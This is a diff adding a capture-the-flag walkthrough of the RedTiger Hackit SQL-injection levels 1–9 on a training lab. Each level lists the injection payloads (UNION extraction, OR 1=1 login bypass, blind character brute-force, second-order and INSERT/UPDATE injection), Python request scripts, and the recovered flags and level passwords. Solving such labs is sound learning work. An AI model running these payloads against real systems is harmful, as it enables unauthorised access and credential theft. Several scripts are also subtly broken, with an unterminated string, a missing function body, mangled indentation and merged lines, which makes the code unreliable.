@@ -1,0 +1,306 @@
+
+thesis:
+
+```sql
+select * from ?table where cat=’$_GET[“cat”]’
+```
+
+## Injection:
+
+```sql
+union select 1,2,username,password from level1_users # 
+```
+
+## Code:
+
+```python
+import requests
+url = "https://redtiger.labs.overthewire.org/level1.php"
+params = {
+“cat”: “1 union select 1,2,username,password from level1_users
+#”
+}
+r = requests.get(url,params)
+print(r.content)
+```
+
+## Flag:
+
+Username: Hornoxe
+
+Password: thatwaseasy
+
+## level2_login:
+
+passwords_will_change_over_time_let_us_do_a_shitty_rhyme
+
+# Level 2:
+
+## Hypothesis:
+
+```sql
+select * from ?table where username=’$_POST[“username”]’ and
+password=’$_POST[“password”]’
+```
+
+## Injection:
+
+```sql
+password’ or 1=1 #
+```
+
+## Code:
+
+```python
+import requests
+url = "https://redtiger.labs.overthewire.org/level2.php"
+cookies = {
+    "level2login":"passwords_will_change_over_time_let_us_do_a_shitty_rhyme"
+}
+payload = {
+    "username": "random",
+    "password": "' or 1=1,
+    "login": "Login"
+}
+r = requests.post(url, cookies=cookies, data=payload, verify=False)
+print(r.content)
+```
+
+## Flag:
+
+level3_login: feed_the_cat_who_eats_your_bread
+
+# Level 3:
+
+## Hypothesis:
+
+```sql
+select * from ?table where usr=’$_GET[“usr”]’
+```
+
+## Array Injection:
+
+```
+usr[] = “”
+
+Warning: preg_match() expects parameter 2 to be string,
+array given in /var/www/hackit/urlcrypt.inc on line 21
+' union select 1,2,3,username,password,6,7 from level3_users where username='Admin' -- 
+```
+
+## Code:
+
+```python
+import requests
+import base64
+def encrypt(x):
+	# encrypt function from urlcrypt.inc 	return encrypted_data
+url = "https://redtiger.labs.overthewire.org/level3.php"
+cookies = {
+    "level3login":"feed_the_cat_who_eats_your_bread"
+}
+params = {
+    "usr": encrypt("' union select 1,2,3,username,password,6,7 from level3_users where username='Admin' -- ")
+}
+r = requests.post(url, cookies=cookies, params=params)
+print(r.content)
+```
+
+## Flag:
+
+Level4_login: put_the_kitten_on_your_head
+
+# Level 4:
+
+## Hypothesis:
+
+```sql
+select * from ?table where id=’$_GET[“id”]’
+```
+
+## Injection:
+
+```sql
+1 union select keyword, 1 from level4_secret where length(keyword)=21
+```
+
+## Code:
+
+```python
+import requests
+s = requests.session()
+stri='abcdefghijklmnopqrstuvwxyz1!'
+headers = {'Cookie': 'level4login=put_the_kitten_on_your_head'}
+result = ''
+for x in range(1,22):
+	for i in stri:
+	url="http://redtiger.labs.overthewire.org/level4.php?id=1
+	union select keyword, 1 from level4_secret where
+	ascii(substring(keyword,%i,1))= %i" % (x, ord(i))
+r = s.get(url, headers=headers)
+if "2 rows" in str(r.content):
+print(x,i)
+result += i
+break
+print(result)
+```
+
+## Flag:
+
+Word: killstickswithbr1cks!
+
+Level5_login: this_hack_it's_old
+
+# Level 5:
+
+## Hypothesis:
+
+```sql
+select * from ?table where username=’$_POST[“username”]’ and
+password=’$_POST[“password”]’
+```
+
+## Injection:
+
+```sql
+#md5(‘a’) => 0cc175b9c0f1b6a831c399e269772661
+‘ union
+select ‘user’, ‘0cc175b9c0f1b6a831c399e269772661’
+```
+
+## Code:
+
+```python
+import requestsurl = "https://redtiger.labs.overthewire.org/level5.php"
+cookies = {
+    "level5login":"this_hack_it's_old"
+}
+params = {
+    "mode": "login"
+}
+# a => 0cc175b9c0f1b6a831c399e269772661
+payloads = {
+    "username": "' union select 'user', '0cc175b9c0f1b6a831c399e269772661",
+    "password": "a",
+    "login": "Login"
+}
+r = requests.post(url, cookies=cookies, params=params, data=payloads)
+print(r.content)
+```
+
+## Flag:
+
+Level6_login: the_stone_is_cold
+
+# Level 6:
+
+## Hypothesis:
+
+```sql
+$user = $_GET["user"]
+SELECT ?,?,?,?,? FROM ? where id=$user
+# 2nd order injection
+```
+
+## Injection:
+
+```sql
+' union select 1,username,3,password,5 from level6_users where status=1 --
+# 0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d31202d2d
+```
+
+## Code:
+
+```python
+
+Code:
+import requests
+url = "https://redtiger.labs.overthewire.org/level6.php"
+cookies = {
+    "level6login":"the_stone_is_cold"
+}
+params = {
+    "user": "0 union select 1,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d31202d2d,3,4,5 from level6_users-- "
+}
+r = requests.post(url, cookies=cookies, params=params)
+print(r.content)
+
+```
+
+# Level 7
+
+## Injection:
+
+```sql
+'
+
+/*
+An error occured!: 
+You have an error in
+your SQL syntax; check the manual that corresponds to your MySQL
+server version for the right syntax to use near '%' OR text.title
+LIKE '%'%')' at line 1
+SELECT news.*,text.text,text.title
+FROM level7_news news, level7_texts text WHERE text.id = news.id AND
+(text.text LIKE '%'%' OR text.title LIKE '%'%')
+*/
+```
+
+## Code:
+
+```sql
+') union select 1,2,3,news.autor from level7_news news, level7_texts text where ( '%' = '%
+```
+
+## Flag:
+
+Username: TestUserforg00gle
+
+Level8_login: or_so_i'm_told
+
+# Level 8:
+
+## Hypothesis:
+
+```sql
+update user set email='$email',icq='$icq',age='$age' where id=1
+```
+
+## Injection:
+
+`I',name=password,icq='`
+
+## Flag:
+
+Password: 19JPYS1jdgvkj
+
+Level9_login:network_pancakes_milk_and_wine 
+
+# Level9:
+
+## Hypothesis:
+
+```sql
+insert into tablename(autor, title, text) values('$autor', '$title', '$text');
+```
+
+## Injection:
+
+```sql
+‘123
+# You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the > right syntax to use near ‘’123’’)’ at line 6')
+```
+
+## Code:
+
+```sql
+, ((select username from level9_users limit 1),(select password from level9_users limit 1), '3') #
+```
+
+## Flag:
+
+Username: TheBlueFlower
+
+Password:this_oassword_is_SEC//Ure.promised! 
+
+Level10_login: whatever_just_a_fresh_password
